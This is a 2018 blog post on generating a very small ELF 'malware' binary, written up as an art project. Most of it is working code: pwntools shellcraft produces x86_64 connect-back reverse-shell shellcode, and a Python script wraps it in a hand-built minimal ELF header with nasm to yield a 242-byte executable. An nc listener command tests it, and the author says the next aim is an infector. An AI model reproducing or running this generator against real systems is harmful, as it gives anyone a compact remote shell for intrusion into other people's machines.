---
title: Generating small elf binaries for fun and profit
date: 2018-04-30T01:33:41+00:00
author: paolo
layout: post
permalink: /2018/04/30/generatins-small-elf-binaries-for-fun-and-profit/
categories:
  - en-US
tags:
  - hacks
  - linux
  - malware
  - osx
---
The ideia was to code an ELF malware smaller then **1kb** to insert it, encoded, inside a bacteriophage modded with _CRISPR/Cas9_ bringing an artistic view of a biologic infector containing a digital infector, an ode to singularity.

Well, to begin with, we gonna use python&#8217;s **pwntool** to generate the base code. On linux, on my test box at digitalocean, I installed with pip. Then,

<pre class="brush: python; title: ; notranslate" title="">paolo@kabbalah:~$ python
Python 2.7.12 (default, Dec  4 2017, 14:50:18)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import os, random, subprocess, string
&gt;&gt;&gt; from pwn import *
&gt;&gt;&gt;
&gt;&gt;&gt; ipaddr = '127.0.0.1'
&gt;&gt;&gt; port = 31337
&gt;&gt;&gt; outfile = 'connectback'
&gt;&gt;&gt;
&gt;&gt;&gt; context(arch='x86_64')
&gt;&gt;&gt;
&gt;&gt;&gt; code = shellcraft.socket(network='ipv4', proto='tcp')
&gt;&gt;&gt; code += shellcraft.connect(ipaddr, port, network='ipv4')
&gt;&gt;&gt; code += shellcraft.dup2('rbp', 0)
&gt;&gt;&gt; code += shellcraft.dup2('rbp', 1)
&gt;&gt;&gt; code += shellcraft.dup2('rbp', 2)
&gt;&gt;&gt; code += shellcraft.sh()
&gt;&gt;&gt;
&gt;&gt;&gt; elf = ELF.from_assembly(code)
[*] '/tmp/pwn-asm-nzvW_p/step3'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
&gt;&gt;&gt; elf.save('lnxmw1')
&gt;&gt;&gt; quit()
paolo@kabbalah:~$ ls -alh lnxmw1
-rw-rw-r-- 1 paolo paolo 4.7K May  1 01:35 lnxmw1
paolo@kabbalah:~$ file lnxmw1
lnxmw1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
paolo@kabbalah:~$
</pre>

As we can see, the binary was ok but too big(**4.7kb**), we have to improve it but first I want to install everything on my macbook. To install the environment on my `OSX sierra` was a little tricky as pip3 version was not working. I solved with:

<pre class="brush: plain; title: ; notranslate" title="">$ python3 -m pip install git+https://github.com/arthaud/python3-pwntools.git
</pre>

after installed, I also had to install **nasm** with **brew install nasm**. So, I had a working environment. The binary tho was still too big. Then, I start to look for some `elf` binary templates to hack into. After checking `/usr/include/elf.h`, _readelf_ and data from generated asm from _pwn_, I endded up with the following script:

<pre class="brush: python; title: ; notranslate" title="">import os, random, subprocess, string
from pwn import *
ipaddr = '127.0.0.1'
port = 31337
outfile = 'binarycrazyness'
context(arch='x86_64')
code = shellcraft.socket(network='ipv4', proto='tcp')
code += shellcraft.connect(ipaddr, port, network='ipv4')
code += shellcraft.dup2('rbp', 0)
code += shellcraft.dup2('rbp', 1)
code += shellcraft.dup2('rbp', 2)
code += shellcraft.sh()
defines=''
for sym in 'SYS_socket', 'SOCK_STREAM', 'SYS_connect', 'SYS_dup2', 'SYS_execve':
    defines += '%s equ %d\n' % (sym, getattr(constants, sym).real)
# for OSX don't have addressFamily.AF_INET (which is, for ipv4, 2) just set it here:
defines += 'AddressFamily.AF_INET equ 2\n'

nasm_code = ("""
BITS 64
  org 0x400000

ehdr:           ; Elf64_Ehdr
  db 0x7f, "ELF", 2, 1, 1, 0 ; e_ident
  times 8 db 0
  dw  2         ; e_type
  dw  0x3e      ; e_machine
  dd  1         ; e_version
  dq  _start    ; e_entry
  dq  phdr - $$ ; e_phoff
  dq  0         ; e_shoff
  dd  0         ; e_flags
  dw  ehdrsize  ; e_ehsize
  dw  phdrsize  ; e_phentsize
  dw  1         ; e_phnum
  dw  0         ; e_shentsize
  dw  0         ; e_shnum
  dw  0         ; e_shstrndx
  ehdrsize  equ  $ - ehdr

phdr:           ; Elf64_Phdr
  dd  1         ; p_type
  dd  5         ; p_flags
  dq  0         ; p_offset
  dq  $$        ; p_vaddr
  dq  $$        ; p_paddr
  dq  filesize  ; p_filesz
  dq  filesize  ; p_memsz
  dq  0x1000    ; p_align
  phdrsize  equ  $ - phdr

_start:
""" + defines
    + code.replace('/*', '; /*')
          .replace('dword ptr [', 'dword [')
    +
"""

filesize  equ  $ - $$
""")

with open('%s.asm' % "".join([random.choice(string.ascii_letters) for i in range(15)]), 'w') as f:
    f.write(nasm_code)
    f.flush()
    subprocess.Popen(['nasm', '-f', 'bin', '-o', outfile, f.name]).wait()
    os.remove(f.name)
    os.chmod(outfile, 0o0755)
</pre>

Now, let&#8217;s run this file

<pre class="brush: bash; title: ; notranslate" title="">paolo@daath ~/Workspace $ python3 gen.py
paolo@daath ~/Workspace $ ls -alH 
-rwxr-xr-x  1 paolo  staff  242 Apr 30 22:07 binarycrazyness
paolo@daath ~/Workspace $ file binarycrazyness
binarycrazyness: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, corrupted section header size
paolo@daath ~/Workspace $
</pre>

this **corrupted section header** size exist due to the forced ASM.

To test it, on a `screen`, run

<pre class="brush: plain; title: ; notranslate" title="">$ nc -l 31337
</pre>

and, on another, run the binary itself. It&#8217;s beautiful and just **242 bytes!!!**

Next steps are to use GETHOSTBYNAME and write an infector.

See you!
